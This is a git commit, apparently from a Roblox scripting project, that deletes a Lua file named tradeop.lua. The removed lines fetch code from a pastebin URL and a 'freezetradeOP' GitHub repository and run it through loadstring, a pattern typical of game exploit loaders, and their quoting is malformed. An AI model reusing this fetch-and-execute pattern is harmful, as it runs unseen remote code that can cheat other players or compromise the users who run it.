cbe2fc4768cb519fd4b9a814d56e4dd8c23d6480
efxxkw <gustavo941419@gmail.com>
2025-01-29 17:08:05 -0300

    Delete tradeop.lua

--- tradeop.lua
+++
@@ -1,7 +0,0 @@
-spawn(function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/JhMqGGfF, true"))()
-end)
-
-spawn(function()
-   loadstring(game:HttpGet(https://raw.githubusercontent.com/efxxkw/freezetradeOP/refs/heads/main/freezetradeOP.lua, true))()
-end)
